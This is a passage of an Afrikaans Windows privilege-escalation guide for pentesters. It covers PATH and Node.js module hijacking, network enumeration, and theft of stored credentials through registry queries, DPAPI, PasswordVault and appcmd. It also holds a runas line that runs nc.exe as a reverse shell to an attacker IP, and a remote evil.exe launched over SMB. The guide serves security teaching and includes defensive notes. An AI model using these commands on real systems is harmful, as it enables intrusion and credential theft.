As jy **skryftoestemmings het binne ’n vouer wat op PATH voorkom**, kan jy moontlik ’n DLL wat deur ’n proses gelaai word hijack en **jou privileges eskaleer**.<sup>[[2]](#references)</sup>

Gaan die toestemmings van al die vouers in PATH na:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Vir meer inligting oor hoe om hierdie kontrole te misbruik:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron-module-resolusie-kaping via `C:\node_modules`

Dit is ’n variant van ’n **Windows-onbeheerde soekpad** wat **Node.js**- en **Electron**-toepassings raak wanneer hulle ’n bare import soos `require("foo")` uitvoer en die verwagte module **ontbreek**.<sup>[[20]](#references)</sup>

Node soek pakkette deur die gidsboom op te loop en `node_modules`-vouers in elke ouergids na te gaan. Op Windows kan daardie soektog tot by die skyfwortel kom, dus kan ’n toepassing wat vanaf `C:\Users\Administrator\project\app.js` geloods word, uiteindelik die volgende nagaan:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

As ’n **gebruiker met lae regte** `C:\node_modules` kan skep, kan hulle ’n kwaadwillige `foo.js` (of pakketgids) plaas en wag totdat ’n **Node/Electron-proses met hoër regte** die ontbrekende afhanklikheid probeer oplos. Die payload loop in die sekuriteitskonteks van die slagofferproses, dus word dit **LPE** wanneer die teiken as ’n administrateur loop, vanuit ’n geskeduleerde taak of diensomhulsel met verhoogde regte loop, of ’n bevoorregte werkskermtoepassing is wat outomaties begin.

Dit kom veral algemeen voor wanneer:

- ’n afhanklikheid in `optionalDependencies` verklaar word<sup>[[22]](#references)</sup>
- ’n derdeparty-biblioteek `require("foo")` met `try/catch` omhul en ná ’n mislukking voortgaan
- ’n pakket uit produksiebouwe verwyder is, tydens verpakking weggelaat is of nie geïnstalleer kon word nie
- die kwesbare `require()` diep binne die afhanklikheidsboom voorkom in plaas van in die hoofprogramkode

### Opsporing van kwesbare teikens

Gebruik **Procmon** om die resolusiepad te bewys:<sup>[[23]](#references)</sup>

- Filter volgens `Process Name` = teikenuitvoerbare lêer (`node.exe`, die Electron-toepassing se EXE of die omhulselproses)
- Filter volgens `Path` `contains` `node_modules`
- Fokus op `NAME NOT FOUND` en die laaste suksesvolle oopmaak onder `C:\node_modules`

Nuttige kodehersieningspatrone in uitgepakte `.asar`-lêers of toepassingsbronkode:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Identifiseer die **missing package name** vanaf Procmon of bronhersiening.
2. Skep die root-opsoekgids as dit nog nie bestaan nie:

```powershell
mkdir C:\node_modules
```

3. Plaas ’n module met die presiese verwagte naam:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Aktiveer die slagoffertoepassing. As die toepassing `require("foo")` probeer uitvoer en die wettige module ontbreek, kan Node `C:\node_modules\foo.js` laai.

Voorbeelde uit die praktyk van ontbrekende opsionele modules wat by hierdie patroon pas, sluit `bluebird` en `utf-8-validate` in, maar die **tegniek** is die herbruikbare deel: vind enige **ontbrekende bare import** wat ’n bevoorregte Windows Node/Electron-proses sal resolve.

### Idees vir opsporing en beveiliging

- Stel ’n waarskuwing op wanneer ’n gebruiker `C:\node_modules` skep of nuwe `.js`-lêers/pakkette daar skryf.
- Soek na prosesse met hoë integriteit wat vanaf `C:\node_modules\*` lees.
- Pak alle runtime-afhanklikhede in produksie in en oudit die gebruik van `optionalDependencies`.
- Hersien derdeparty-kode vir stil `try { require("...") } catch {}`-patrone.
- Deaktiveer opsionele probes wanneer die biblioteek dit ondersteun (byvoorbeeld, sommige `ws`-ontplooiings kan die verouderde `utf-8-validate`-probe vermy met `WS_NO_UTF_8_VALIDATE=1`).

## Netwerk

### Netwerkdelings

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts-lêer

Kyk in die hosts-lêer vir ander bekende rekenaars wat hardgekodeer is.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Netwerkkoppelvlakke & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Oop poorte

Kyk van buite af vir **beperkte dienste**

```bash
netstat -ano #Opened ports?
```

Vir ’n plaaslike luisteraar, korreleer sy PID met die proseseienaar, uitvoerbare lêer se pad en enige diens of geskeduleerde taak wat dit begin. ’n Afstandbeheerdiens kan slegs toegang as sy lessenaatgebruiker gee indien sy verifikasie- en opdragbeheer dit toelaat. ’n Pasgemaakte TCP-toepassing wat as ’n rekening met hoër voorregte loop, is ’n afsonderlike teikengebied vir ondersoek: die luisteraar en binêre lêer se pad is passiewe leidrade, terwyl ’n geverifieerde roete vir geheuekorrupsie-ontginning ontleding van daardie presiese binêre lêer en sy bereikbare invoer vereis. As ’n blootgestelde poort blykbaar aan ’n stelselproses behoort, vergelyk dit met [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) voordat jy die backend-diens daaraan toeskryf; ’n aanstuurreël alleen bewys nie dat die bestemming bereikbaar of kwesbaar is nie.

### Roetetabel

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP-tabel

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall-reëls

[**Gaan hierdie bladsy na vir Firewall-verwante commands**](../basic-cmd-for-pentesters.md#firewall) **(lys reëls, skep reëls, skakel af, skakel af...)**

Meer [commands vir network enumeration hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Die binêre `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

As jy root-gebruiker kry, kan jy op enige poort luister (die eerste keer dat jy `nc.exe` gebruik om op ’n poort te luister, sal ’n GUI vra of `nc` deur die firewall toegelaat moet word).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Om bash maklik as root te begin, kan jy `--default-user root` probeer.

Jy kan die `WSL`-lêerstelsel verken in die vouer `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` binne WSL gee nie op sigself Windows Administrator-regte nie. As die huidige Windows-identiteit ’n verspreiding se lêerstelsel kan lees, gaan shell-history-lêers (insluitend `/root/.bash_history`) na vir opdragte waarin geloofsbriewe moontlik aangeteken is; eskalasie vereis steeds ’n geldige rekening met hoër voorregte en ’n toegelate verifikasiemetode. Die `LocalState\rootfs`-uitleg is van toepassing op ouer WSL-installasies; WSL 2 stoor die verspreiding gewoonlik in ’n [`ext4.vhdx`-virtuele skyf](https://learn.microsoft.com/en-us/windows/wsl/disk-space), so identifiseer eers die werklike verspreiding en bergingspad. Vermy dit om geskiedenisinhoud tydens outomatiese enumerasie te vertoon.

## Windows-aanmeldbewyse

### Winlogon-aanmeldbewyse

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Behandel `DefaultUserName` en `DefaultDomainName` as rekeningkonteks, nie as geloofsbriewe nie. ’n Nie-leë `DefaultPassword`- of `AltDefaultPassword`-waarde is ’n plaintext-registerbevinding. As `AutoAdminLogon=1` is, maar geen plaintext-wagwoord leesbaar is nie, is dit slegs ’n leidraad: [Sysinternals Autologon kan die wagwoord as ’n LSA-geheim stoor](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), en gewone registerlesings stel nie vas of daardie geheim bestaan of herwin kan word nie. Gaan toegangsregte en die werklike aanmeldkonfigurasie na voordat jy ’n blootstelling van geloofsbriewe rapporteer.

### Geloofsbriewebestuurder / Windows-kluis

Van [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault stoor gebruikers se geloofsbriewe vir bedieners, webwerwe en ander programme wat **Windows** kan gebruik om **gebruikers outomaties aan te meld**. Aanvanklik kan dit klink asof gebruikers geloofsbriewe vir webwerwe soos Facebook, Twitter of Gmail kan stoor en blaaiers outomaties kan laat aanmeld, maar dit is nie hoe dit werk nie.

Windows Vault stoor geloofsbriewe waarmee Windows gebruikers outomaties kan aanmeld. Dit beteken dat enige **Windows-toepassing wat geloofsbriewe nodig het om toegang tot ’n hulpbron** (bediener of webwerf) te kry, **hierdie Credential Manager** en Windows Vault kan gebruik en die verskafte geloofsbriewe kan gebruik, in plaas daarvan dat gebruikers elke keer die gebruikersnaam en wagwoord invoer.

Tensy die toepassings met Credential Manager kommunikeer, dink ek nie dat hulle die geloofsbriewe vir ’n gegewe hulpbron kan gebruik nie. As jou toepassing dus die kluis wil gebruik, moet dit op een of ander manier **met die geloofsbriewebestuurder kommunikeer en die geloofsbriewe vir daardie hulpbron** uit die verstekbergingskluis aanvra.

Gebruik `cmdkey` om die gestoorde geloofsbriewe op die masjien te lys.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Dan kan jy `runas` met die `/savecred`-opsie gebruik om die gestoorde geloofsbriewe te gebruik. In die volgende voorbeeld word ’n afgeleë binêre lêer via ’n SMB-share aangeroep.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Gebruik `runas` met 'n verskafde stel aanmeldbewyse.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Let daarop dat mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), of die [Empire Powershells-module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) gebruik kan word.

### UWP PasswordVault / Credential Locker

Moderne Windows UWP-toepassings, Microsoft Edge en moderne stelseldienste stoor verifikasietokens en wagwoorde in gewone teks binne die Universal Windows Platform (UWP) `PasswordVault` (ook as `Web Credentials` in `vaultcmd` beskikbaar). Hierdie stoorspasie is sessie-geïsoleer en kan op ’n inheemse manier gedekripteer word sonder administratiewe regte of `SeDebugPrivilege`-regte.

Voer hierdie PowerShell-opdrag binne die gebruiker se aktiewe sessie uit om onmiddellik alle gestoorde gebruikersname en wagwoorde in gewone teks te dump en te dekripteer:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Die **Data Protection API (DPAPI)** bied ’n metode vir simmetriese enkripsie van data, wat hoofsaaklik binne die Windows-bedryfstelsel gebruik word vir die simmetriese enkripsie van asimmetriese private sleutels. Hierdie enkripsie gebruik ’n gebruiker- of stelselgeheim om beduidend tot die entropie by te dra.

**DPAPI maak dit moontlik om sleutels te enkripteer met ’n simmetriese sleutel wat uit die gebruiker se aanmeldgeheime afgelei word**. In gevalle waar stelselenkripsie gebruik word, benut dit die stelsel se domeinverifikasiegeheime.

Geënkripteerde RSA-gebruikersleutels word met DPAPI in die `%APPDATA%\Microsoft\Protect\{SID}`-gids gestoor, waar `{SID}` die gebruiker se [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) verteenwoordig. **Die DPAPI-sleutel, wat saam met die master key wat die gebruiker se private sleutels beskerm in dieselfde lêer geleë is**, bestaan tipies uit 64 grepe ewekansige data. (Let daarop dat toegang tot hierdie gids beperk is, wat verhoed dat die inhoud daarvan met die `dir`-opdrag in CMD gelys word, hoewel dit deur PowerShell gelys kan word.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Jy kan die **mimikatz-module** `dpapi::masterkey` met die toepaslike argumente (`/pvk` of `/rpc`) gebruik om dit te dekripteer.

Die **geloofsbriewelêers wat deur die hoofwagwoord beskerm word**, is gewoonlik hier geleë:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Jy kan die **mimikatz-module** `dpapi::cred` met die toepaslike `/masterkey` gebruik om te dekripteer.\
Jy kan baie DPAPI-**masterkeys** uit **geheue** **onttrek** met die `sekurlsa::dpapi`-module (as jy root is).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-geloofsbriewe

**PowerShell-geloofsbriewe** word dikwels vir **scripting**- en outomatiseringstake gebruik as ’n gerieflike manier om geënkripteerde geloofsbriewe te stoor. Die geloofsbriewe word met **DPAPI** beskerm, wat gewoonlik beteken dat hulle slegs deur dieselfde gebruiker op dieselfde rekenaar waarop hulle geskep is, gedekripteer kan word.

’n Uitgevoerde geloofsbrief kan enige lêernaam of `.xml`-pad hê. Wanneer ’n script of lêerinventaris na een verwys, bepaal die rekening se werklike profielgids eerder as om `C:\Users` te veronderstel: [Windows kan profiele elders plaas](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). ’n Leesbare lêer is slegs ’n leidraad; [Windows se `Export-Clixml` bind ’n geënkripteerde geloofsbrief aan die uitvoerende gebruiker en rekenaar](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), en enige herwonne rekening moet afsonderlik geldige regte op die beoogde diens hê. Gaan eers paaie en ACL’s na, sonder om geënkripteerde of gewone tekswaardes tydens roetine-opsomming te vertoon.

Om PS-geloofsbriewe uit die lêer waarin dit voorkom te **dekripteer**, kan jy die volgende doen:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Gestoorde RDP-verbindings

Jy kan hulle vind by `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
en by `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Opdragte wat onlangs uitgevoer is

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Bestuurder vir Remote Desktop-aanmeldbewyse**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Gebruik die **Mimikatz**-module `dpapi::rdg` met die toepaslike `/masterkey` om **enige .rdg-lêers te dekripteer**\
Jy kan **baie DPAPI-masterkeys** uit geheue onttrek met die Mimikatz-module `sekurlsa::dpapi`

**mRemoteNG gebruik ’n ander verbindingstoor.** Inspekteer leesbare XML onder `%APPDATA%\mRemoteNG` en in gebruiker se Documents, insluitend lêers met gewone name soos `config.xml`. Identifiseer die verbinding-skema en geënkripteerde `Password`-eienskappe voordat jy ’n XML-lêer as ’n moontlike bron van aanmeldbesonderhede beskou. Die gestoorde waarde is nie ’n DPAPI/RDCMan-wagwoord nie; herwinning hang af van die lêer se enkripsie-instellings en of ’n pasgemaakte hoofwagwoord gebruik is. Vermy dit om geënkripteerde waardes te vertoon tydens breë enumerasie.

**Remote Desktop Plus-profieleksporte** kan ook in gebruikergidse of ’n gedeelde administrasiegids leesbaar wees. ’n Verouderde `profiles.xml`-uitvoer bevat `Data/Profile`-inskrywings met `ProfileName`-, `Password`- en `Secure`-elemente. Beskou ’n nie-leë wagwoordelement as ’n moontlike bron van aanmeldbesonderhede, sonder om dit te vertoon of aan te neem dat dit gewone teks is: [die verskaffer se notas](https://www.donkz.nl/) meld dat profielbeskerming aan die rekening en rekenaar wat dit geskep het gekoppel kan wees, of minder streng ingestel kan wees. Bevestig die lêer se oorsprong en voorwaardes vir herwinning voordat jy daarop staatmaak.

### Sticky Notes

Mense gebruik dikwels die StickyNotes-toepassing op Windows-werkstasies om **wagwoorde** en ander inligting te **stoor**, sonder om te besef dat dit ’n databasislêer is. Die lêer is hier geleë: `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; dit is altyd die moeite werd om daarna te soek en dit te ondersoek.

Mense stoor soms wagwoorde en ander inligting in plaknota-toepassings. Microsoft se verpakte Sticky Notes-toepassing stoor notas gewoonlik by `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; ouer of ander toepassings kan ander gebruikersprofiel-stoorplekke gebruik, insluitend LevelDB. Bepaal watter toepassing geïnstalleer is en watter stoorformaat dit gebruik voordat jy die afwesigheid van notas aflei uit ’n ontbrekende SQLite-lêer.

As Sticky Notes SQLite se write-ahead logging gebruik, kan ’n kopie van net `plum.sqlite` onlangse, vasgelegde notas weglaat. Hou die ooreenstemmende `plum.sqlite-wal` saam met ’n konsekwente kopie van die databasis, en sluit `plum.sqlite-shm` in indien beskikbaar; die geheuegedeelde indeks kan herbou word, maar die WAL is deel van die databasis se volgehoue toestand. Sien [SQLite se WAL-dokumentasie](https://www.sqlite.org/wal.html). ’n Nota wat ’n rekeningnaam of wagwoord bevat, is slegs ’n moontlike bron van aanmeldbesonderhede: verifieer die rekening, toegelate toegang en hergebruik van die wagwoord afsonderlik. ’n Geënkripteerde wagwoordbestuurderrekord vereis ook sy werklike dekripsiesleutel en toepassingspesifieke interpretasie voordat dit ’n aanmelding met hoër voorregte kan bevestig.

### AppCmd.exe

**Let daarop dat jy Administrateur moet wees en onder ’n High Integrity-vlak moet werk om wagwoorde uit AppCmd.exe te herwin.**\
**AppCmd.exe** is in die `%systemroot%\system32\inetsrv\`-gids geleë.\
As hierdie lêer bestaan, is dit moontlik dat sommige **aanmeldbesonderhede** opgestel is en **herwin** kan word.

Hierdie kode is uit [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) onttrek:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Kyk of `C:\Windows\CCM\SCClient.exe` bestaan .\
Installers word **met SYSTEM-voorregte uitgevoer**, baie is kwesbaar vir **DLL Sideloading (Inligting van** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Lêers en Register (Aanmeldbewyse)

### Aanmeldbewysartefakte in register van ondersteuningsnutsgoed

Sommige ouer afstandsondersteuningsinstallasies behou wagwoordverwante waardename onder vaste toepassingregistersleutels. Byvoorbeeld, TeamViewer se `SecurityPasswordAES` het in weergawes voor 9 ’n opgestelde statiese sessiewagwoord aangedui, volgens die [verskaffer se verduideliking van die registersleutel](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). ’n Waardenaammerker is slegs ’n leidraad vir ondersoek: verifieer die geïnstalleerde weergawe, leesbare waardedata, formaat en huidige verifikasiegedrag voordat jy daardie aanmeldbewys beoordeel. Om van ’n afstandondersteuningswagwoord na ’n meer bevoorregte Windows-rekening oor te skakel, vereis ook werklike wagwoordhergebruik en magtiging vir daardie rekening. Hou syferteks en herwonne wagwoorde uit roetine-enumerasie-uitvoer.

### Gedeelde sigblaaie met beskermde werkblaaie

As vermoed word dat ’n leesbare gedeelde werkboek rekeningdata bevat, onderskei **lêerenkripsie** van werkbladbeskerming of versteekte kolomme. [Microsoft meld](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) dat werkbladbeskerming wysigings beheer en nie ’n sekuriteitskenmerk is nie; dit bewys op sigself nie dat die werkboekinhoud geënkripteer is nie. Gaan slegs gemagtigde, relevante lêers na en vermy dit om moontlike geheime tydens breë enumerasie uit te druk. ’n Leesbare `.xlsx`-pad, ’n beskermde werkblad of ’n versteekte kolom bewys op sigself nie dat aanmeldbewyse bestaan of dat enige rekening hoër voorregte het nie; verifieer die werklike data en huidige rekeningregte afsonderlik.

### CI-bediener se behoue veranderingskolle

’n CI-bediener kan ingediende bronkodeveranderings in sy datagids behou selfs nadat die bouproses voltooi is. [TeamCity dokumenteer](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` as berging vir afstand-uitgevoerde veranderings; die datagids kan opgestel word en is nie noodwendig onder `ProgramData` nie. ’n Leesbare kol kan verwysings na ’n aanmeldbewyslêer, ’n enkripsiesleutel of ’n skrip wat albei gebruik, bewaar—hetsy dit verwyder of bygevoeg is. Byvoorbeeld, ’n PowerShell-werkvloei met `ConvertTo-SecureString -Key` benodig die AES-sleutel sowel as die geënkripteerde string; [Microsoft dokumenteer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) dat die sleutel afsonderlik verskaf word. Gaan eers slegs toeganklike kolname na, en inspekteer dan relevante inhoud met magtiging, sonder om geheime in roetine-enumerasie-uitvoer uit te druk. ’n Kolpad, ’n geënkripteerde waarde of ’n sleutelverwysing bewys op sigself nie dat ’n aanmeldbewys geldig is of toegang met hoër voorregte moontlik is nie. Beperk die ACL’s van die datagids en vermy dit om geheime by bouveranderings in te sluit.

### Pasgemaakte rotasie van plaaslike administrateurwagwoorde

’n Tuisgemaakte wagwoordrotator kan ’n geënkripteerde plaaslike administrateurwagwoord in ’n plaaslike diens stoor, terwyl sy datastooraanmeldbewyse in ’n leesbare `.env`-lêer of langs die opdateringsprogram se binêre lêer gehou word. Gaan die opdateringstaak, rekening, konfigurasie-ACL’s, luisteraar en datastoortoestemmings saam na. ’n Datastoordiens wat slegs aan loopback gebind is, is steeds bereikbaar vir ’n plaaslike gebruiker met geldige aanmeldbewyse, maar verifikasie alleen bewys nie toestemming om die relevante rekords te lees nie. As die enkripsiesaad of sleutelmateriaal langs die syferteks toeganklik is, gaan die presiese sleutelafleiding na voordat jy die enkripsie vertrou. ’n Skema wat deterministies ’n AES-sleutel uit ’n blootgestelde saad met Go se [`math/rand`](https://pkg.go.dev/math/rand) aflei, is nie geskik om daardie wagwoord te beskerm nie; Go dokumenteer dat daardie pakket ongeskik is vir sekuriteitsensitiewe ewekansigheid. Bevestig dat enige herwonne wagwoord tans geldig is en aan ’n rekening in die plaaslike Administrators-groep behoort voordat jy dit as ’n voorregverhogingsroete beskou. ’n Geskeduleerde taak, `.env`-pad of geënkripteerde blob bewys nie een van daardie voorwaardes nie. Hou wagwoorde en sleutelmateriaal uit roetine-enumerasie-uitvoer.

Gebruik [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) vir bestuurde plaaslike administrateurwagwoorde. Die gids- of Entra-ondersteunde berging daarvan en toegangsbeheer verskil van dié van ’n pasgemaakte plaaslike datastoordiens; [Elasticsearch-rolle](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) bepaal eweneens of ’n geverifieerde datasto gebruiker ’n spesifieke indeks kan lees.

### Java-bedienerinprop-argiewe en hergebruik van aanmeldbewyse

Sommige Java-bedienerinproppe word as JAR-argiewe in ’n bediener se `plugins`-gids versprei. ’n Leesbare pasgemaakte inprop kan konfigurasie of bytecode bevat met ’n ingebedde diensaanmeldbewys. Gaan die argief slegs met magtiging na en hou herwonne geheime uit roetine-enumerasie-uitvoer. ’n Inprop-pad bewys op sigself nie dat ’n geheim bestaan nie, en ’n herwonne dienswagwoord lei slegs tot hoër voorregte as dit ook vir ’n meer bevoorregte rekening geldig is. Gaan die relevante lêer-ACL’s na en vervang hergebruikte aanmeldbewyse met afsonderlike geheime. Sien [PaperMC se inprop-installasiegids](https://docs.papermc.io/paper/adding-plugins/) vir die gidsuitleg en [Oracle se JAR-dokumentasie](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) vir argiefinhoud.

### Openfire-ingebedde databasisaanmeldbewyse

’n Openfire-installasie wat sy ingebedde databasis gebruik, kan `openfire.script` onder `Openfire\embedded-db` hou. As die huidige rekening dit kan lees, gaan die `OFUSER`-rekords en die `passwordKey`-eienskap saam na. Openfire se [dokumentasie oor gebruikersverskaffers](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) meld dat wagwoorde in gewone teks gestoor of geënkripteer kan word met ’n sleutel wat in daardie eienskap gehou word. ’n Herwonne wagwoord is slegs relevant vir voorregverhoging as dit steeds geldig is vir ’n meer bevoorregte identiteit; die lêernaam bewys nie leesregte of hergebruik van aanmeldbewyse nie. Die pad is ’n leidraad vir inventarisering, dus hou databasisinhoud en aanmeldbewyse uit roetine-enumerasie-uitvoer.

